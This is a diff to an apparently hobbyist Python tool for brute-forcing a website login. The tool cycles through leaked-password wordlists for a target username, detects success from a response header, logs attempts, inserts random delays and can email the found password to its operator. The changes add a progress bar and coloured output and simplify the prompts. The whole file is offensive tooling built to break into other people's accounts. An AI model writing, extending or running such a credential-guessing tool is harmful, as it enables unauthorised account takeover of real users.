@@ -67,7 +67,7 @@ Contact me on Discord with any other site recommendations!
 for i, line in enumerate(ascii_art.splitlines()):
     color = rainbow_colors[i % len(rainbow_colors)]
     print(color + line)
-    time.sleep(2)
+    time.sleep(0.1)
 
 print(Style.RESET_ALL)
 
@@ -146,6 +146,7 @@ def estimate_time_left(total_attempts, passwords, start_time):
 def brute_force(username, password_files, token=None, cookie=None, email_updates=None):
     total_attempts = 0
     start_time = time.time()
+    progress_bar = tqdm(total=100, desc="Brute Force Progress", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} attempts")
     for password_file in password_files:
         passwords = read_passwords(password_file)
         if not passwords:
@@ -158,20 +159,21 @@ def brute_force(username, password_files, token=None, cookie=None, email_updates
 
             total_attempts += 1
             if response and 'X-CSRF-Token' in response.headers:
-                print(f"Password found: {password}")
+                print(f"\n{Fore.GREEN}[INFO] Password found: {password}{Style.RESET_ALL}")
                 log_attempt(username, password, True)
                 track_passwords_per_minute(start_time, total_attempts)
                 if email_updates:
                     send_email(True, username, password, email_updates)
                 return
             else:
-                print(f"Trying password: {password}")
+                print(f"{Fore.YELLOW}Trying password: {password}{Style.RESET_ALL}")
                 log_attempt(username, password, False)
 
             if total_attempts % 10 == 0:
                 track_passwords_per_minute(start_time, total_attempts)
                 estimate_time_left(total_attempts, passwords, start_time)
 
+            progress_bar.update(1)
             time.sleep(random.uniform(1, 3))
 
     if email_updates:
@@ -180,13 +182,7 @@ def brute_force(username, password_files, token=None, cookie=None, email_updates
 if __name__ == "__main__":
     print(ascii_art)
     username = input("Enter the username: ")
-    token = input("Enter Bearer Token (if applicable, press Enter to skip): ")
-    cookie = input("Enter Cookie (if applicable, press Enter to skip): ")
+    password_files = ['passwords.txt']
+    email_updates = input("Enter email for updates (optional): ").strip()
 
-    email_choice = input("Do you want email updates? (midway/end/none): ").lower()
-    email_updates = None
-    if email_choice in ['midway', 'end']:
-        email_updates = input("Enter your email to receive notifications: ")
-
-    password_files = ['darkweb2017-top10000.txt', 'fortinet-2021_passwords.txt']
-    brute_force(username, password_files, token if token else None, cookie if cookie else None, email_updates)
+    brute_force(username, password_files, email_updates=email_updates)
